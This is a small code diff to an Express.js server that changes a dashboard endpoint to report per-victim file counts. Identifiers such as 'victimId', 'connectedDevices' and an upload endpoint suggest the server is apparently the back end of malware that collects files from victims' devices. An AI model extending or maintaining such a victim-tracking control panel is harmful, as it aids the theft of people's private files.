@@ -155,15 +155,16 @@ app.post('/upload', (req, res) => {
 
 // Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
-     const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
-        const totalFilesReceived = device.fileList.length; // Count files received
+    const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
+        // Use the victimFileCounts to get the total number of files for each victim
+        const totalFilesReceived = victimFileCounts[victimId] || 0;  // Default to 0 if no files received
 
         return {
             ...device,
             totalFiles: totalFilesReceived, // Add the total files field
         };
     });
-    res.json(connectedDevices);
+    res.json(dashboardData);  // Return the updated data
 });
 
 // File download endpoint
